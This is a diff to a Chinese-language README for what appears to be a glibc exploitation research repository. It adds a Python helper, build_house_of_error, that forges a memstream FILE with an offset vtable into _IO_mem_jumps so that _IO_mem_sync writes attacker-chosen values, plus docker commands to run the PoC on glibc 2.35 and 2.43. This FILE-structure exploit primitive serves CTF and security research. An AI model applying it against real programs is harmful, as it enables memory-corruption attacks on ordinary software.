@@ -61,6 +61,31 @@ fake_vtable = _IO_mem_jumps + (0x60 - 0x28)
 
 这份 PoC 直接借用真实 memstream 的扩展对象，只为了单独隔离出最终触发点，并不虚构题目级别的 largebin/标准流投递能力；原始 2.35 那套端到端菜单 exploit 和附件在 FSOPAgain 仓库的 `poc3/` 目录下。
 
+## Python 离线板子
+
+```python
+from error import build_house_of_error
+
+writes = build_house_of_error(
+    file_addr=fake_file,
+    mem_jumps_addr=libc_base + mem_jumps_offset,
+    bufloc_addr=target_pointer_slot,
+    sizeloc_addr=target_size_slot,
+    write_base_addr=controlled_buffer,
+    write_length=0x123,
+)
+```
+
+| 参数 | 含义 |
+|---|---|
+| `file_addr` | fake/被覆盖 memstream FILE 地址。 |
+| `mem_jumps_addr` | `_IO_mem_jumps` 地址；函数按 `sync(0x60)-uflow(0x28)=+0x38` 生成合法偏移 vtable。 |
+| `bufloc_addr` / `sizeloc_addr` | `_IO_mem_sync` 两次写入的目标地址。 |
+| `write_base_addr` | 第一次写入的值，即 `_IO_write_base`。 |
+| `write_length` | `_IO_write_ptr - _IO_write_base`，第二次写入的 size 值；不是独立任意 qword。 |
+
+返回一个 memstream FILE 镜像，函数不负责投递、触发或修复 Build ID 私有布局。
+
 ```bash
 ./tools/run_in_docker.sh 2.35 house_of_error/poc_mem_sync_2.24_2.43.c
 ./tools/run_in_docker.sh 2.43 house_of_error/poc_mem_sync_2.24_2.43.c
